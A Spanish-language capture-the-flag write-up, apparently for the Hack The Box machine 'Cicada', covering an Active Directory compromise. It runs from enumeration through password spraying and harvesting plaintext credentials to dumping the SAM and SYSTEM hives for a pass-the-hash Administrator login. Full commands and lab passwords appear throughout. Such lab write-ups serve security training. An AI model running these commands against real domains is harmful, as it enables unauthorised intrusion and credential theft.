#AD 
# Enumeración

Hacemos una enumeración inicial de puertos con [[00.- Herramientas/NMAP|NMAP]]
`nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.129.231.149 -oG allPorts`

Obtenemos los siguientes puertos abiertos
```shell
[*] IP Address: 10.129.231.149
[*] Open ports: 53,88,135,139,389,445,464,593,636,3268,3269,5985,56018
```

A continuación lanzaremos un [[NMAP]] mas profundo a los puertos explotados
`nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,56018 -sCV 10.129.231.149 -oN targeted`


## Enumeración Kerberos (88)
### Enumeración de usuarios
Para enumerar los usuarios de la maquina usaremos [[CRACKMAPEXEC]] con los parametros
- `userenum` para indicar que queremos enumerar usuarios
- `--dc` para indicar la IP de la maquina victima
- `-d` para indicar el dominio
```shell
kerbrute userenum  --dc 10.129.231.149 -d cicada.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

Nos descubre los usuarios `guest` y `administrator`

## Enumeración RPC (135)
Nos intentamos conectar a la maquina sin credenciales usando [[RPCCLIENT]] con el parámetro
- `-U` para pasar un usuario en este caso un campo vacío
```shell
rpcclient -U "" 10.129.231.149
```

Nos deja acceder pero no podemos enumerar usuarios del dominio con `enumdomusers`, tampoco podemos enumerar grupos de dominio `enumdomgroups`

##  Enumeración SMB (139, 445)
Usaremos [[CRACKMAPEXEC]] para enumerar el `SMB`
`nxc smb 10.129.231.149`

Nos devuelve como resultado que el dominio es `cicada.htb`, el cual añadimos al `/etc/hosts` como `10.129.231.149  cicada.htb dc01 dc01.cicada.htb`

### Recursos compartidos
Enumeraremos los recursos compartidos con [[CRACKMAPEXEC]] con el parámetro `--shares` vara ver los recursos compartidos en red
`nxc smb 10.129.231.149 --shares`
### Null Session
Podemos enumerar con una `Null Session` usando [[SMBCLIENT]] 
`smbclient -L 10.129.231.149 -N`

O usando [[CRACKMAPEXEC]] con la opción
- `--shares` para enumerar los recursos compartidos en red 
- `-u`  para pasar un usuario en este `guest`
- `-p` para pasar una password en este caso con el campo vacío
```shell
nxc smb 10.129.231.149 --shares -u 'guest' -p ''
```

Nos devuelve los siguiente recursos compartidos
```shell
Disk           Permissions     Comment
----          -----------     -------
ADMIN$         NO ACCESS       Remote Admin
C$             NO ACCESS       Default share
DEV            NO ACCESS
HR             READ ONLY
IPC$           READ ONLY       Remote IPC
NETLOGON       NO ACCESS       Logon server share
SYSVOL         NO ACCESS       Logon server share
```

Observamos un recurso compartido llamado `HR` al que podemos acceder a leer su contenido usamos [[SMBMAP]] con la opción:
- `-H` para pasarle la IP de la maquina victima
- `-u` para pasarle un usuario  en este caso `guest` 
- `-p` para pasarle una contraseña, en este caso el campo vacío`''`
- `-r` para buscar recursivamente en el recurso compartido `HR`
```shell
smbmap -H 10.129.231.149 -u 'guest' -p '' -r HR
```

Vemos un archivo `.txt` así que nos lo traemos a nuestra maquina usando [[SMBCLIENT]]
```shell
smbclient //10.129.231.149/HR -N
```

Nos lo traemos con el comando
```shell
get "Notice from HR.txt"
```

EL archivo dice lo siguiente
```txt
Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's e
ssential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned abov
e.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix o
f uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your passwo
rd with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to 
our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp

```

El archivo nos indica que la contraseña es `Cicada$M6Corpb*@Lp#nZp!8`, pero en este caso no disponemos de un listado de usuarios

### Enumeración de usuarios
Usaremos [[CRACKMAPEXEC]]  para enumerar los usuarios usando los parámetros
- `-u` para pasar un usuario
- `-p` para pasar una password
- `--rid-brute` para enumerar los usuarios validos
```shell
nxc smb 10.129.231.149 -u 'guest' -p '' --rid-brute
```

Para quedarnos solo con los usuarios que nos interesan usaremos la siguiente expresión regular
```shell
nxc smb 10.129.231.149 -u 'guest' -p '' --rid-brute | grep "SidTypeUser"
```

Nos los copiamos, guardamos en un archivo y utilizamos la siguiente expresión regular para obtener solo los nombres
```shell
cat users| awk '{print $2}' | tr '\\' ' ' | awk 'NF{print $NF}'
```

Hemos obtenido la siguiente lista de usuarios
```txt
Administrator
Guest
krbtgt
CICADA-DC$
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
emily.oscars
```

## Verificar usuarios validos
Para verificar si los usuarios son validos ejecutaremos [[KERBRUTE]] con el parametro
- `userenum` para enumerar usuarios
- `--dc` para indicar la IP de la maquina victima
- `-d` para indicar el dominio
- Y al final le pasamos la lista con los usuarios
```shell
kerbrute userenum  --dc 10.129.231.149 -d cicada.htb users
```

Nos devuelve que los usuarios son validos probaremos con este listado potencial de usuarios ver si son susceptibles al ataque  [[#AS-REP Roasting Attack]]

# Explotación
## AS-REP Roasting Attack
Para ver si son susceptibles los usuarios a este ataque usaremos la herramienta `IMPACKET` con los parámetros
- `-no-pass` para no usar contraseña
- `-usersfile` para pasar una lista de usuarios
```shell
impacket-GetNPUsers -no-pass -usersfile users.txt cicada.htb/
```

Después de ejecutarlo vemos que los usuarios no son susceptibles

## Password spraying
Con la contraseña que hemos obtenido del `.txt` en [[#Enumeración SMB (139, 445)]] y los usuarios con [[#Enumeración de usuarios]] usando la herramienta [[CRACKMAPEXEC]] con la opción
- `smb` para usar el servicio SMB para hacer el ataque
- `-u` para pasarle una lista de usuarios
- `-p` para pasarle una lista de contraseñas
```shell
nxc smb 10.129.231.149 -u users.txt -p passwords
```

Despues de la ejecución optemos las siguientes credenciales
```ad-hint
michael.wrightson::Cicada$M6Corpb*@Lp#nZp!8
```

### Validar usuario encontrado
Con [[CRACKMAPEXEC]] validaremos si el usuario encontrado anteriormente es valido usando los parámetros
- `smb` para usar el servicio SMB para hacer el ataque
- `-u` para pasarle un usuario
- `-p` para pasarle una contraseña
```shell
nxc smb 10.129.231.149 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

### Validar si el usuario pertenece a Remote Managemet
También validaremos si el usuario pertenece al grupo de remote management, usando [[CRACKMAPEXEC]] con las opciones
- `winrm` para usar el servicio WINRM
- `-u` para pasarle un usuario
- `-p` para pasarle una contraseña
```shell
nxc winrm 10.129.231.149 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

En caso de que pertenezca a este aparecería el `pwned` en este caso el usuario no pertenece a este grupo así que podemos seguir explotando [[#Password spraying]] sobre los demás usuarios con [[CRACKMAPEXEC]] con las opciones
- `smb` para usar el servicio SMB para hacer el ataque
- `-u` para pasarle una lista de usuarios
- `-p` para pasarle una lista de contraseñas
- `--continue-on-success` para que no se pare aunque encuentre una coincidencia valida
```shell
nxc smb 10.129.231.149 -u users.txt -p passwords --continue-on-success
```

Después de la finalización no nos devuelve ningún usuario mas con las credenciales reutilizadas

## Listar recursos compartidos con credenciales validas

Para listar estos recursos compartidos con un usuario valido usaremos [[CRACKMAPEXEC]] con las opciones
- `-u`  para pasar un usuario
- `-p` para pasar una password
- `--shares` para enumerar los recursos compartidos en red 
```shell
nxc smb 10.129.231.149 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --shares
```

```shell
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
DEV                             
HR              READ            
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share 
SYSVOL          READ            Logon server share 
```


## Enumeración interna (RPC)

Haremos una enumeración desde dentro con
`rpcclient -U 'michael.wrightson%Cicada$M6Corpb*@Lp#nZp!8' 10.129.231.149`

- Enumerar usuarios de dominio `enumdomusers`
- Enumerar grupos del dominio `enumdimgroups`

No encontramos ningún usuario adicional a los que ya tenemos
También podemos enumerar las descripciones de los usuarios con `querydispinfo`

También podemos listar las descripciones de los usuarios con
`nxc smb 10.129.231.149 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --users`

Vemos que el usuario `david.orelious` tiene como password `aRt$Lp#7t*VQ!3` ya que lo tiene apuntado en su descripción

Verificamos que las credenciales son validas
`nxc smb 10.129.231.149 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3'`

```ad-hint
david.orelious::aRt$Lp#7t*VQ!3
```

También podemos ver si pertenece a remote managemets
`nxc winrm 10.129.231.149 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3'`

Listaremos los recursos compartidos de este usuario
`nxc smb 10.129.231.149 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares`

Vemos que tenemos permisos de lectura sobre `DEV`
```txt
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
DEV             READ            
HR              READ            
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share
SYSVOL          READ            Logon server share
```

Listaremos los recursos compartidos de dentro de `DEV`
`smbmap -H 10.129.231.149 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' -r DEV`

Nos conectaremos con las credenciales por `SMB` y nos traeremos el archivop `.ps1` a nuestra maquina para examinarlo
`smbclient //10.129.231.149/DEV -U 'david.orelious%aRt$Lp#7t*VQ!3'`

Al traernos el archivo y verlo encontramso unas credenciales de un usuario `emily.oscars` y una contraseña `Q!3@Lp#M6b*7t*Vt`

Verificamos si estas son correctas
`nxc smb 10.129.231.149 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'`

```ad-hint
emily.oscars::Q!3@Lp#M6b\*7t\*Vtz
```
La contraseña esta escapada

Verificamos si pertenece al grupo de remote management+
`nxc winrm 10.129.231.149 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'`

Vemos que si que pertenece al grupo así que nos conectamos 
`evil-winrm  -i 10.129.231.149 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'`

Para ver a que grupo pertenecemos ejecutaremos
`net user emily.oscars`, viendo que pertenecemos al grupo `Backup Operators`

Para ver los privilegios que tiene nuestro usuario usaremos 
`whoami /priv`

Una vez nos hemos conectados habrá que escalar privilegios


## Escalada de privilegios

Vemos que tenemos privilegios que no deben de estar como por ejemplo `SeBackupPrivilege`

Buscamos en el navegador como abusar de el, encontramos un repositorio de github `https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md`

En el que se explica paso por paso la escalada de privilegios

Primero deberemos crear un directorio `/temp` con `mkdir C:\temp`

Segundo se copia la `sam` al directorio `/temp` que hemos creado yde `system` guardándolo en nuestro `/temp` con `reg save hklm\sam C:\temp\sam.hive`
y con `reg save hklm\system C:\temp\system.hive`

Tercero pasamos el archivo `sam` y `system`  a nuestra maquina atacante con `download sam.hive` y con  `download system.hive`para poder coger los hashes de los usuarios actuales con `impacket-secretsdump -sam sam.hive -system system.hive LOCAL`

Obtenmiendo asi el hash del usuario administrador 
```ad-hint
Administrator:2b87e7c93a3e8a0ea4a581937016f341
```

Ahora nos podmeos conectar a la maquina siendo `Administrador` gracias al hash
`evil-winrm  -i 10.129.231.149 -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341`







